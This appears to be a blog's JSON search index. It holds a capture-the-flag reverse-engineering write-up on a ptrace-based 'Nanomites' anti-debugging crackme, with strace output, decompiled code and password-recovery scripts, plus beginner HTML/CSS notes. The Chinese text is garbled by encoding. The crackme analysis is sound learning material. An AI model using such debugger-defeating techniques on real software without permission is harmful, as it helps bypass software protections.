{"meta":{"title":"FINSENTY54","subtitle":"å‡ å¤„æ—©èºäº‰æš–æ ‘ï¼Œè°å®¶æ–°ç‡•å•„æ˜¥æ³¥ã€‚","description":"blog","author":"finsenty54","url":"http://finsenty54.github.io","root":"/"},"pages":[{"title":"","date":"2019-11-18T11:42:09.534Z","updated":"2019-02-27T03:24:00.000Z","comments":true,"path":"googleda09d6ee39745173.html","permalink":"http://finsenty54.github.io/googleda09d6ee39745173.html","excerpt":"","text":"google-site-verification: googleda09d6ee39745173.html"},{"title":"about","date":"2019-04-26T07:15:52.000Z","updated":"2020-07-06T06:10:41.789Z","comments":true,"path":"about/index.html","permalink":"http://finsenty54.github.io/about/index.html","excerpt":"","text":"æœ¬ç§‘æ¯•ä¸šå–½ï¼Œæ–°ç ”ä¸€.o(ï¿£â–½ï¿£)ãƒ–"},{"title":"categories","date":"2020-04-10T07:30:47.000Z","updated":"2020-04-10T07:33:07.916Z","comments":true,"path":"categories/index.html","permalink":"http://finsenty54.github.io/categories/index.html","excerpt":"","text":""},{"title":"rss","date":"2019-04-26T07:28:26.000Z","updated":"2019-04-26T07:48:06.000Z","comments":true,"path":"rss/index.html","permalink":"http://finsenty54.github.io/rss/index.html","excerpt":"","text":"æˆ‘çš„rss:https://finsenty54.github.io/atom.xml ï¼Œæ¬¢è¿è®¢é˜…ï¼"},{"title":"tags","date":"2020-04-10T07:29:52.000Z","updated":"2020-04-10T07:33:09.616Z","comments":true,"path":"tags/index.html","permalink":"http://finsenty54.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ELF x64 - Nanomites - Introduction_WP","slug":"ELF x64 - Nanomites - Introduction_WP","date":"2020-10-31T02:39:38.000Z","updated":"2020-10-31T02:41:04.191Z","comments":true,"path":"2020/10/31/ELF x64 - Nanomites - Introduction_WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/31/ELF x64 - Nanomites - Introduction_WP/","excerpt":"ELF x64 - Nanomites - Introduction_WPè¿™æ˜¯è¿ç”¨äº†Debug BlockeræŠ€æœ¯çš„é¢˜ç›®åˆèŠ±äº†äº›æ—¶é—´ï¼Œç»ˆäºç ´è§£äº† gdb è®¾ç½®è·Ÿè¸ªçˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹set follow-fork-mode parrent|childå½“å‘ç”Ÿforkæ—¶ï¼ŒæŒ‡ç¤ºè°ƒè¯•å™¨æ‰§è¡Œçˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ ptraceåœ¨ç¨‹åºæ‰§è¡Œåˆ°int3æ—¶ï¼Œå°±ä¼šè§¦å‘ SIGTRAPä¿¡å·ï¼Œ","text":"ELF x64 - Nanomites - Introduction_WPè¿™æ˜¯è¿ç”¨äº†Debug BlockeræŠ€æœ¯çš„é¢˜ç›®åˆèŠ±äº†äº›æ—¶é—´ï¼Œç»ˆäºç ´è§£äº† gdb è®¾ç½®è·Ÿè¸ªçˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹set follow-fork-mode parrent|childå½“å‘ç”Ÿforkæ—¶ï¼ŒæŒ‡ç¤ºè°ƒè¯•å™¨æ‰§è¡Œçˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ ptraceåœ¨ç¨‹åºæ‰§è¡Œåˆ°int3æ—¶ï¼Œå°±ä¼šè§¦å‘ SIGTRAPä¿¡å·ï¼Œ long ptrace(enum __ptrace_request request, pid_t pid, void addr, void data);å‚æ•°dataï¼šä½œç”¨åˆ™æ ¹æ®requestçš„ä¸åŒè€Œå˜åŒ–ï¼Œå¦‚æœéœ€è¦å‘ç›®æ ‡è¿›ç¨‹ä¸­å†™å…¥æ•°æ®ï¼Œdataå­˜æ”¾çš„æ˜¯éœ€è¦å†™å…¥çš„æ•°æ®ï¼›å¦‚æœä»ç›®æ ‡è¿›ç¨‹ä¸­è¯»æ•°æ®ï¼Œdataå°†å­˜æ”¾è¿”å›çš„æ•°æ® straceå¯ä»¥å…ˆç”¨straceæ¥è§‚å¯Ÿåœ¨ç³»ç»Ÿè°ƒç”¨strace -i ./ch28.bin12345678910111213141516171819202122[00007fa5f9b6bf4e] read(0, toto /è¾“å…¥å€¼\"toto\\n\", 1024) = 5[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000[00007fa5f9b4857b] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)[00007fa5f9b6bff3] write(1, \"Wrong! try hard! :)\\n\", 20Wrong! try hard! :)) = 20[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)[00007fa5f9b48759] exit_group(0) = ?[????????????????] +++ exited with 0 +++ å½“æˆ‘è¾“å…¥å€¼â€˜totoâ€™ï¼Œè§¦å‘äº†ä¸¤æ¬¡ SIGTRAPï¼Œä¹‹åé€€å‡º åç¼–è¯‘ç›´æ¥IDA PROåç¼–è¯‘å…¶ä»–çš„ç»†èŠ‚éƒ½ä¸ç®¡ï¼Œå°±çœ‹æˆ‘ä»¬éœ€è¦çš„1234567891011121314151617181920212223242526272829303132333435363738int __fastcall sub_400871(__int64 input)&#123; int result; // eax int stat_loc; // [rsp+1Ch] [rbp-F4h] void *v3; // [rsp+F8h] [rbp-18h] __pid_t pid; // [rsp+104h] [rbp-Ch] void *dest; // [rsp+108h] [rbp-8h] stat_loc = 0; dest = mmap(0LL, 0x141uLL, 7, 34, -1, 0LL); // 0x7ffff7ffb000 memcpy(dest, src, 0x8DuLL); // src == 0x601080 æŒ‡å‘400ac0( 0x48 pid = fork(); if ( !pid ) // å­è¿›ç¨‹ &#123; if ( ptrace(0, 0LL, 0LL, 0LL) == -1 ) &#123; puts(\"So you want to trace me?!\"); exit(42); &#125; v3 = dest; ((void (__fastcall *)(__int64))dest)(input); exit(0); &#125; while ( waitpid(pid, &amp;stat_loc, 0) != -1 ) &#123; if ( (unsigned __int8)stat_loc == 127 ) &#123; if ( BYTE1(stat_loc) == 5 ) // 0x57f &gt;&gt;8 =0x5 sub_400736((__int64)dest, pid); ptrace(PTRACE_CONT, (unsigned int)pid, 0LL, 0LL); //è¡¨ç¤ºç»§ç»­æ‰§è¡Œå­è¿›ç¨‹ &#125; &#125; if ( BYTE1(stat_loc) ) result = puts(\"Wrong! try hard! :)\"); else result = puts(\"POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!\"); return result;&#125; å­è¿›ç¨‹ä¼šæ‰§è¡Œ memcpy()hå‡½æ•°å¤åˆ¶åˆ°destçš„ä»£ç ï¼Œsrc == 0x601080 æŒ‡å‘400ac0ï¼Œæ‰€ä»¥å®é™…å¤åˆ¶çš„æ˜¯400ac0å¤„çš„æŒ‡ä»¤ã€‚ RDIä¿å­˜ç€æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œæ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜å…¥alï¼Œä¹‹åint3,å°±ä¼šè§¦å‘SIGTRAPï¼Œçˆ¶è¿›ç¨‹è¿›è¡Œè°ƒè¯•å­è¿›ç¨‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall sub_400736(__int64 dest, unsigned int pid)&#123; __int64 result; // rax char v3; // [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX å­è¿›ç¨‹å¯„å­˜å™¨å€¼æ”¾åœ¨è¿™é‡Œ __int64 v4; // [rsp+60h] [rbp-A0h] __int64 v5; // [rsp+90h] [rbp-70h] __int64 v6; // [rsp+A0h] [rbp-60h] 0x400a30 æœ‰é—®é¢˜ __int64 dest_1; // [rsp+F0h] [rbp-10h] int i; // [rsp+F8h] [rbp-8h] unsigned __int8 v9; // [rsp+FFh] [rbp-1h] // 0x20cf9 å­è¿›ç¨‹pid v9 = 0; dest_1 = dest + 1; // dest + 1 result = ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3);// è·å–å€¼æ‰€æœ‰å¯„å­˜å™¨å€¼ï¼Ÿï¼Ÿ // for ( i = 0; i &lt;= 12; ++i ) // 13ä¸ªint 3 &#123; // rbp-0x8 = i result = seg_6010A0[3 * i]; if ( v5 - dest_1 == result ) // v5 = 0x7ffff7ffb00c // c-1 = b ==11 &#123; result = (unsigned int)v9++ + 1; if ( v9 ) &#123; if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )// v4 == input è¡¨ç¤ºè¾“å…¥å€¼æ”¾åœ¨å­è¿›ç¨‹r9ä¸­ 0x7fffffffdc50 v6 |= 0x40uLL; // ä¿®æ”¹äº†V6 0x7fffffffdc90 ç¬¬åå…«ä¸ª è¡¨ç¤ºEFLAGS // ä¹‹å‰ rax å¤„ ç¨‹åº JE zf=0 æ‰ä¸è·³è½¬ å¦‚æœè·³è½¬åˆ™ç¨‹åºç»“æŸ result = ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3);// è®¾ç½®å€¼ break; &#125; &#125; &#125; if ( !v9 ) &#123; puts(\"Hummmmmmm NO WAY.\"); exit(42); &#125; return result;&#125; ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)è·å–æ‰€æœ‰å­è¿›ç¨‹å¯„å­˜å™¨å€¼ï¼Œå­˜æ”¾åœ¨V3åœ°å€å¤„ã€‚ if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )// v4 == input è¡¨ç¤ºè¾“å…¥å€¼æ”¾åœ¨å­è¿›ç¨‹r9ä¸­ 0x7fffffffdc50è¿™æ¡è¯­å¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œå…¶å°†æˆ‘ä»¬çš„è¾“å…¥å€¼ä¸6010A0å¤„çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™ä¿®æ”¹V6ï¼Œä¹Ÿå°±æ˜¯EFLAGSï¼Œå°†ZFç½®1ï¼ŒJNEä¸è·³è½¬ï¼Œå¦‚æœè·³è½¬äº†ç›´æ¥ç»“æŸè¿›ç¨‹ã€‚ ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)å°†ä¿®æ”¹åçš„å¯„å­˜å™¨å€¼é‡æ–°èµ‹ç»™å­è¿›ç¨‹ ä»ifçŸ¥é“ï¼Œæ¯”è¾ƒå…±è¿›è¡Œ13æ¬¡ï¼Œä¸‹é¢ç¼–å†™pythonè„šæœ¬12345678910111213141516171819202122data=[]flag=[]print(\"give me a bottle of rum!\")with open('ch28.txt','rt') as f: for line in f.readlines(): if(line.find('db')!=-1): pos=line.find('db') item=line[pos+4:pos+6] data.append(int(item,16))for i in data: print(format(i,'x'))for i in range(13): flag.append(data[3*i+1+i%2])print('1111111111111111111111111111')for i in flag: print(chr(i),end='')print()print(len(flag)) ch28.txtä¿å­˜6010A0å¼€å§‹çš„æ•°æ®ã€‚ è¿è¡Œå¾—åˆ°flag make -n æ˜¾ç¤ºå‘½ä»¤ï¼Œä½†ä¸æ‰§è¡Œ å¤§ä½¬ä»£ç 12345678910111213141516171819202122232425262728import gdbimport repassword = \"start_with_anything\"gdb.execute('file ./ch28.bin')gdb.execute('set pagination off')gdb.execute('br *0x40080d')gdb.execute('run &lt;&lt;&lt; '+password)rdx = gdb.execute('info reg rdx',to_string=True)rdx = re.findall('^rdx\\s+\\w+\\s+(\\d+)$', rdx)password = \"\" + chr( int(rdx[0]) )while True: gdb.execute('run &lt;&lt;&lt; '+password) # Continue to last character for i in password: gdb.execute('c') try: rdx = gdb.execute('info reg rdx',to_string=True) except gdb.error: # If info reg fails it is probably because the program has exited. break rdx = re.findall('^rdx\\s+\\w+\\s+(\\d+)$', rdx) password += chr( int(rdx[0]) )print(\"Password found is :\"+password)gdb.execute('quit') è®ºæ–‡ æƒ³æ³•äº‘æ”»å‡» è®©VMæ”¯æŒå»é‡ï¼Œç„¶åflush+reload å»ºç«‹cpu cacheçš„éšæœºç­–ç•¥æ˜ å°„","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"å‰ç«¯å­¦ä¹ _html_css_1","slug":"å‰ç«¯å­¦ä¹ _html_css_1","date":"2020-10-29T13:10:00.000Z","updated":"2020-10-29T13:10:56.944Z","comments":true,"path":"2020/10/29/å‰ç«¯å­¦ä¹ _html_css_1/","link":"","permalink":"http://finsenty54.github.io/2020/10/29/å‰ç«¯å­¦ä¹ _html_css_1/","excerpt":"å‰ç«¯å­¦ä¹ htmlå°çŸ¥è¯†è¿æ¥ 80 ç«¯å£éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆéç®¡ç†å‘˜ç”¨æˆ·åªèƒ½ç›‘å¬å¤§äº 1024 çš„ç«¯å£ æµï¼ˆstreamï¼‰ä»£è¡¨ä¸€ä¸ªå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´æ‰“å¼€çš„è¿æ¥ã€‚ ï¼Ÿé—­åŒ…ä½œä¸ºå‚æ•°ï¼Ÿ","text":"å‰ç«¯å­¦ä¹ htmlå°çŸ¥è¯†è¿æ¥ 80 ç«¯å£éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆéç®¡ç†å‘˜ç”¨æˆ·åªèƒ½ç›‘å¬å¤§äº 1024 çš„ç«¯å£ æµï¼ˆstreamï¼‰ä»£è¡¨ä¸€ä¸ªå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´æ‰“å¼€çš„è¿æ¥ã€‚ ï¼Ÿé—­åŒ…ä½œä¸ºå‚æ•°ï¼Ÿ &lt;!DOCTYPE html&gt;â€” æ–‡æ¡£ç±»å‹ã€‚æ··æ²Œåˆåˆ†ï¼ŒHTML å°šåœ¨è¥è¤“ï¼ˆå¤§çº¦æ˜¯ 1991/92 å¹´ï¼‰ä¹‹æ—¶ï¼ŒDOCTYPE ç”¨æ¥é“¾æ¥ä¸€äº› HTML ç¼–å†™å®ˆåˆ™ï¼Œæ¯”å¦‚è‡ªåŠ¨æŸ¥é”™ä¹‹ç±»ã€‚DOCTYPE åœ¨å½“ä»Šä½œç”¨æœ‰é™ï¼Œä»…ç”¨äºä¿è¯æ–‡æ¡£æ­£å¸¸è¯»å–ã€‚ç°åœ¨çŸ¥é“è¿™äº›å°±è¶³å¤Ÿäº†ã€‚ html&lt;html&gt; å…ƒç´ ã€‚è¯¥å…ƒç´ åŒ…å«æ•´ä¸ªé¡µé¢çš„å†…å®¹ï¼Œä¹Ÿç§°ä½œæ ¹å…ƒç´ ã€‚ head&lt;head&gt;å…ƒç´ ã€‚è¯¥å…ƒç´ çš„å†…å®¹å¯¹ç”¨æˆ·ä¸å¯è§ï¼Œå…¶ä¸­åŒ…å«ä¾‹å¦‚é¢å‘æœç´¢å¼•æ“çš„æœç´¢å…³é”®å­—ï¼ˆkeywordsï¼‰ã€é¡µé¢æè¿°ã€CSS æ ·å¼è¡¨å’Œå­—ç¬¦ç¼–ç å£°æ˜ç­‰ã€‚ &lt;meta charset=&quot;utf-8&quot;&gt;è¯¥å…ƒç´ æŒ‡å®šæ–‡æ¡£ä½¿ç”¨ UTF-8 å­—ç¬¦ç¼–ç  ï¼ŒUTF-8 åŒ…æ‹¬ç»å¤§å¤šæ•°äººç±»å·²çŸ¥è¯­è¨€çš„å­—ç¬¦ã€‚åŸºæœ¬ä¸Š UTF-8 å¯ä»¥å¤„ç†ä»»ä½•æ–‡æœ¬å†…å®¹ï¼Œè¿˜å¯ä»¥é¿å…ä»¥åå‡ºç°æŸäº›é—®é¢˜ï¼Œæ²¡æœ‰ç†ç”±å†é€‰ç”¨å…¶ä»–ç¼–ç ã€‚ &lt;title&gt;å…ƒç´ ã€‚è¯¥å…ƒç´ è®¾ç½®é¡µé¢çš„æ ‡é¢˜ï¼Œæ˜¾ç¤ºåœ¨æµè§ˆå™¨æ ‡ç­¾é¡µä¸Šï¼Œä¹Ÿä½œä¸ºæ”¶è—ç½‘é¡µçš„æè¿°æ–‡å­—ã€‚ body&lt;body&gt;å…ƒç´ ã€‚è¯¥å…ƒç´ åŒ…å«æœŸæœ›è®©ç”¨æˆ·åœ¨è®¿é—®é¡µé¢æ—¶çœ‹åˆ°çš„å†…å®¹ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾åƒã€è§†é¢‘ã€æ¸¸æˆã€å¯æ’­æ”¾çš„éŸ³è½¨æˆ–å…¶ä»–å†…å®¹ã€‚ img&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;æµ‹è¯•å›¾ç‰‡&quot;&gt; altï¼Œæ˜¯å›¾åƒçš„æè¿°å†…å®¹ å±æ€§srcä¹Ÿæ˜¯å±æ€§ï¼Œèµ„æº åˆ—è¡¨listulæ— åºolæœ‰åºåˆ—è¡¨çš„æ¯ä¸ªé¡¹ç›®ç”¨ä¸€ä¸ªåˆ—è¡¨é¡¹ç›®ï¼ˆList Itemï¼‰å…ƒç´  &lt;li&gt; åŒ…å›´ &lt;ul&gt; æ— åºåˆ—è¡¨ &lt;li&gt;æŠ€æœ¯äººå‘˜&lt;/li&gt; &lt;li&gt;æ€è€ƒè€…&lt;/li&gt; &lt;li&gt;å»ºé€ è€…&lt;/li&gt; &lt;/ul&gt; ####aé“¾æ¥éå¸¸é‡è¦ â€” å®ƒä»¬èµ‹äºˆ Web ç½‘ç»œå±æ€§ã€‚è¦æ¤å…¥ä¸€ä¸ªé“¾æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªç®€å•çš„å…ƒç´  â€” &lt;a&gt; â€” a æ˜¯ â€œanchorâ€ ï¼ˆé”šï¼‰çš„ç¼©å†™ &lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla å®£è¨€&lt;/a&gt; hrefæ˜¯å±æ€§ æµ‹è¯•æœ¬åœ°æ–‡ä»¶å®ƒä»¬å…·æœ‰æœåŠ¡ç«¯ä»£ç ã€‚ æœåŠ¡å™¨ç«¯è¯­è¨€ï¼ˆå¦‚ PHP æˆ– Pythonï¼‰éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„æœåŠ¡å™¨æ¥è§£é‡Šä»£ç å¹¶æä¾›ç»“æœã€‚ å±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetï¼Œç®€ç§°ï¼šCSSï¼‰æ˜¯ä¸ºç½‘é¡µæ·»åŠ æ ·å¼çš„ä»£ç è¦é€‰æ‹©ä¸€ä¸ª HTML é¡µé¢é‡Œæ‰€æœ‰çš„æ®µè½å…ƒç´ ï¼Œç„¶åå°†å…¶ä¸­çš„æ–‡æœ¬æ”¹æˆçº¢è‰²ï¼Œå¯ä»¥è¿™æ ·å†™ CSSp { color: red;}å†å°†è¯¥ CSS æ–‡ä»¶è¿æ¥è‡³ HTML æ–‡æ¡£ï¼Œå¦åˆ™ CSS ä»£ç ä¸ä¼šå¯¹ HTML æ–‡æ¡£åœ¨æµè§ˆå™¨é‡Œçš„æ˜¾ç¤ºæ•ˆæœæœ‰ä»»ä½•å½±å“ JavaScriptï¼ˆç¼©å†™ï¼šJSï¼‰æ˜¯ä¸€é—¨å®Œå¤‡çš„ åŠ¨æ€ç¼–ç¨‹è¯­è¨€ å¯¹è±¡ï¼šJavaScript é‡Œä¸€åˆ‡çš†å¯¹è±¡ï¼Œä¸€åˆ‡çš†å¯å‚¨å­˜åœ¨å˜é‡é‡Œã€‚ ä¾‹å¦‚disabled å±æ€§ï¼Œä»–ä»¬å¯ä»¥æ ‡è®°è¡¨å•è¾“å…¥ä½¿ä¹‹å˜ä¸ºä¸å¯ç”¨(å˜ç°è‰²)ï¼Œ å®ä½“å¼•ç”¨ï¼š åœ¨HTMLä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ &lt; &amp;lt; &gt; &amp;gt; &quot; &amp;quot; &apos; &amp;apos; &amp; &amp;amp; æ³¨é‡ŠHTMLä¸­çš„å†…å®¹ç½®ä¸ºæ³¨é‡Šï¼Œä½ éœ€è¦å°†å…¶ç”¨ç‰¹æ®Šçš„è®°å·&lt;!--å’Œ--&gt;åŒ…æ‹¬èµ·æ¥ metaè®¸å¤š&lt;meta&gt;å…ƒç´ åŒ…å«äº†name å’Œ content ç‰¹æ€§ï¼š name æŒ‡å®šäº†meta å…ƒç´ çš„ç±»å‹ï¼› è¯´æ˜è¯¥å…ƒç´ åŒ…å«äº†ä»€ä¹ˆç±»å‹çš„ä¿¡æ¯ã€‚content æŒ‡å®šäº†å®é™…çš„å…ƒæ•°æ®å†…å®¹ã€‚ spanåœ¨ä½ çš„ç«™ç‚¹å¢åŠ è‡ªå®šä¹‰å›¾æ ‡è¿™æ˜¯ä¸€ä¸ª &lt;span&gt;å…ƒç´ ï¼Œå®ƒæ²¡æœ‰è¯­ä¹‰ã€‚å½“æ‚¨æƒ³è¦å¯¹å®ƒç”¨CSSï¼ˆæˆ–è€…JSï¼‰æ—¶ï¼Œæ‚¨å¯ä»¥ç”¨å®ƒåŒ…è£¹å†…å®¹ï¼Œä¸”ä¸éœ€è¦é™„åŠ ä»»ä½•é¢å¤–çš„æ„ä¹‰ æ–‡å­—æ ·å¼æ— åº&lt;ul&gt;æœ‰åº Ordered&lt;ol&gt; å…ƒç´ å°†ä¸€ä¸ªåˆ—è¡¨åµŒå…¥åˆ°å¦ä¸€ä¸ªåˆ—è¡¨æ˜¯å®Œå…¨å¯ä»¥çš„ç”¨&lt;em&gt;ï¼ˆemphasisï¼‰å…ƒç´ æ¥æ ‡è®°æ–œä½“&lt;strong&gt;åŠ ç²—&lt;i&gt;è¢«ç”¨æ¥ä¼ è¾¾ä¼ ç»Ÿä¸Šç”¨æ–œä½“è¡¨è¾¾çš„æ„ä¹‰ï¼šå¤–å›½æ–‡å­—ï¼Œåˆ†ç±»åç§°ï¼ŒæŠ€æœ¯æœ¯è¯­ï¼Œä¸€ç§æ€æƒ³â€¦â€¦&lt;b&gt; è¢«ç”¨æ¥ä¼ è¾¾ä¼ ç»Ÿä¸Šç”¨ç²—ä½“è¡¨è¾¾çš„æ„ä¹‰ï¼šå…³é”®å­—ï¼Œäº§å“åç§°ï¼Œå¼•å¯¼å¥â€¦â€¦&lt;u&gt; è¢«ç”¨æ¥ä¼ è¾¾ä¼ ç»Ÿä¸Šç”¨ä¸‹åˆ’çº¿è¡¨è¾¾çš„æ„ä¹‰ï¼šä¸“æœ‰åè¯ï¼Œæ‹¼å†™é”™è¯¯â€¦â€¦ä¸è¦ç”¨ è¶…é“¾æ¥&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla ä¸»é¡µ&lt;/a&gt; altå±æ€§æ·»åŠ æ”¯æŒä¿¡æ¯ &lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt; &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;é“¾æ¥è‡³ Mozilla ä¸»é¡µçš„ Mozilla æ ‡å¿—&quot;&gt; &lt;/a&gt; å¯ä»¥æœ‰ä¸¤ä¸ªindex.htmlæ–‡ä»¶ï¼Œå‰ææ˜¯ä»–ä»¬åœ¨ä¸åŒçš„ç›®å½•ä¸‹ æŒ‡å‘ä¸Šçº§ç›®å½•ï¼š å¦‚æœä½ æƒ³åœ¨projects/index.htmlä¸­åŒ…å«ä¸€ä¸ªæŒ‡å‘pdfs/project-brief.pdfçš„è¶…é“¾æ¥ï¼Œä½ å¿…é¡»å…ˆè¿”å›ä¸Šçº§ç›®å½•ï¼Œç„¶åå†å›åˆ°pdfç›®å½•ã€‚â€œè¿”å›ä¸Šä¸€ä¸ªç›®å½•çº§â€ä½¿ç”¨ä¸¤ä¸ªè‹±æ–‡ç‚¹å·è¡¨ç¤º â€” .. â€” æ‰€ä»¥ä½ åº”è¯¥ä½¿ç”¨çš„URLæ˜¯../pdfs/project-brief.pdf è¶…é“¾æ¥é™¤äº†å¯ä»¥é“¾æ¥åˆ°æ–‡æ¡£å¤–ï¼Œä¹Ÿå¯ä»¥é“¾æ¥åˆ°HTMLæ–‡æ¡£çš„ç‰¹å®šéƒ¨åˆ†ï¼ˆè¢«ç§°ä¸ºæ–‡æ¡£ç‰‡æ®µï¼‰ã€‚å¿…é¡»é¦–å…ˆç»™è¦é“¾æ¥åˆ°çš„å…ƒç´ åˆ†é…ä¸€ä¸ªidå±æ€§ &lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;æˆ‘ä»¬çš„åœ°å€&lt;/a&gt; &lt;a href=&quot;#Mailing_address&quot;&gt; å½“é“¾æ¥åˆ°åŒä¸€ç½‘ç«™çš„å…¶ä»–ä½ç½®æ—¶ï¼Œä½ åº”è¯¥ä½¿ç”¨ç›¸å¯¹é“¾æ¥ï¼ˆå½“é“¾æ¥åˆ°å¦ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œä½ éœ€è¦ä½¿ç”¨ç»å¯¹é“¾æ¥ä½¿ç”¨ç»å¯¹URLæ—¶ï¼Œæµè§ˆå™¨é¦–å…ˆé€šè¿‡DNSï¼ˆè§ä¸‡ç»´ç½‘æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼‰æŸ¥æ‰¾æœåŠ¡å™¨çš„çœŸå®ä½ç½® 12&lt;a href=\"https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN\" download=\"firefox-latest-64bit-installer.exe\"&gt; é»˜è®¤ä¿å­˜æ–‡ä»¶å ç½‘ç«™ç»“æ„åˆ›å»ºç½‘ç«™çš„ä¸€ç§å¸¸è§æ–¹å¼â€”â€”æ¯ä¸€é¡µéƒ½ä½¿ç”¨ç›¸åŒçš„é¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç›¸åŒçš„å¯¼èˆªèœå• &lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;å‘ nowhere å‘é‚®ä»¶&lt;/a&gt; ä½¿ç”¨ä¸Šæ ‡å’Œä¸‹æ ‡ã€‚ &lt;sup&gt; å’Œ&lt;sub&gt;å…ƒç´ å¯ &lt;p&gt;å¦‚æœ x&lt;sup&gt;2&lt;/sup&gt; çš„å€¼ä¸º 9ï¼Œé‚£ä¹ˆ x çš„å€¼å¿…ä¸º 3 æˆ– -3ã€‚&lt;/p&gt; ä¸ºäº†å®ç°è¯­ä¹‰åŒ–æ ‡è®°ï¼ŒHTML æä¾›äº†æ˜ç¡®è¿™äº›åŒºæ®µçš„ä¸“ç”¨æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š 12345&lt;header&gt;ï¼šé¡µçœ‰ã€‚&lt;nav&gt;ï¼šå¯¼èˆªæ ã€‚&lt;main&gt;ï¼šä¸»å†…å®¹ã€‚ä¸»å†…å®¹ä¸­è¿˜å¯ä»¥æœ‰å„ç§å­å†…å®¹åŒºæ®µï¼Œå¯ç”¨&lt;article&gt;ã€&lt;section&gt; å’Œ &lt;div&gt; ç­‰å…ƒç´ è¡¨ç¤ºã€‚&lt;aside&gt;ï¼šä¾§è¾¹æ ï¼Œç»å¸¸åµŒå¥—åœ¨ &lt;main&gt; ä¸­ã€‚&lt;footer&gt;ï¼šé¡µè„šã€‚ 12345&lt;span&gt; æ˜¯ä¸€ä¸ªå†…è”çš„ï¼ˆinlineï¼‰æ— è¯­ä¹‰å…ƒç´ ï¼Œä½¿ç”¨ class å±æ€§æä¾›ä¸€äº›æ ‡ç­¾ï¼Œä½¿è¿™äº›å…ƒç´ èƒ½æ˜“äºæŸ¥è¯¢&lt;div&gt; æ˜¯ä¸€ä¸ªå—çº§æ— è¯­ä¹‰å…ƒç´ ï¼Œåº”ä»…ç”¨äºæ‰¾ä¸åˆ°æ›´å¥½çš„å—çº§å…ƒç´ æ—¶ï¼Œæˆ–è€…ä¸æƒ³å¢åŠ ç‰¹å®šçš„æ„ä¹‰æ—¶&lt;br&gt; 